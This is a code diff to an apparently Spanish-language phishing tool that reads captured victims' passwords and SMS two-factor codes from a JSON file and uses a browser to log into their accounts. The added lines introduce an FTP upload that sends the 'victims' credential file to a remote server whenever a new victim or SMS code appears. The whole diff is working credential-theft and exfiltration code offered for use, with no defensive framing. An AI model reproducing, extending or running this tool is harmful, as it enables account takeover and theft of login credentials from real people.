@@ -5,6 +5,7 @@ import json
 import os
 import time
 import hashlib
+import ftplib
 
 def find(name, path):
     for root, dirs, files in os.walk(path):
@@ -18,6 +19,40 @@ def md5(fname):
         for chunk in iter(lambda: f.read(4096), b""):
             hash_md5.update(chunk)
     return hash_md5.hexdigest()
+
+def is_ftp():
+	return int(len(sys.argv)) == int(2) and sys.argv[1] == 'ftp'
+
+def upload_file(path_file, file_name, server, user, passwd):
+	print("uploading file " + file_name +'.json')
+	session = ftplib.FTP(server, user, passwd)
+	file = open(path_file,'rb')                  # file to send
+	session.storbinary('STOR '+file_name+'.json', file)     # send the file
+	file.close()                                    # close file and FTP
+	session.quit()
+
+def check_ftp_connection(server, user, passwd):
+	try:
+		session = ftplib.FTP(server, user, passwd)
+		session.quit()
+
+		return True
+	except:
+		return False
+
+if is_ftp():
+	server_ftp = input('FTP SERVER:')
+	user_ftp = input('FTP USER:')
+	pass_ftp = input('FTP PASSWORD:')
+	ftp_file_name = input("Name of the file to Upload ('victims' by default PRESSING ENTER) : ") or "victims"
+
+	if check_ftp_connection(server_ftp, user_ftp, pass_ftp):
+		print("FTP Login Successful, wait")
+		time.sleep(2)
+	else:
+		print("FTP Login Error, check credentials and rerun script")
+		sys.exit()
+
 
 print(""" 
 88888888b  .d888888   a88888b.  88888888b  888888ba   .88888.   .88888.  dP     dP         
@@ -34,11 +69,11 @@ d8'    88  88     88    88    d8'   `8b          88        d8'   `8b d8'   `88 8
 88     88  88     88    88    88     88 88888888 88        88     88 88   YP88 88 88     88 
 88     88  Y8.   .8P    88    Y8.   .8P          88        Y8.   .8P Y8.   .88 88 88     88 
 88     88  `Y88888P'    dP     `8888P'           88888888P  `8888P'   `88888'  dP dP     dP 
-                                                                                            
+                                                                                                                                                                                        
 
 Esperando contraseñas de las victimas, no cierres el script ...
 
-
+  - By BorjaGalisteo
                                                                                             """)
 
 first_time = True
@@ -67,6 +102,9 @@ while True:
 	if len(victims) == victims_count:
 		print("La victima puso el SMS code")
 
+		if is_ftp():
+			upload_file(file,ftp_file_name, server_ftp, user_ftp, pass_ftp)
+
 		for hour in victims:
 			data = victims[hour]
 			sms_code = data['sms']
@@ -80,6 +118,8 @@ while True:
 		continue
 	else:
 		print("Nueva Victima encontrada... Abriendo navegador")
+		if is_ftp():
+			upload_file(file,ftp_file_name, server_ftp, user_ftp, pass_ftp)
 		victims_count = len(victims)
 
 	for hour in victims:
@@ -104,4 +144,3 @@ while True:
 	time.sleep(2)
 	enter = web.find_element_by_css_selector('button.selected')
 	enter.click()
-
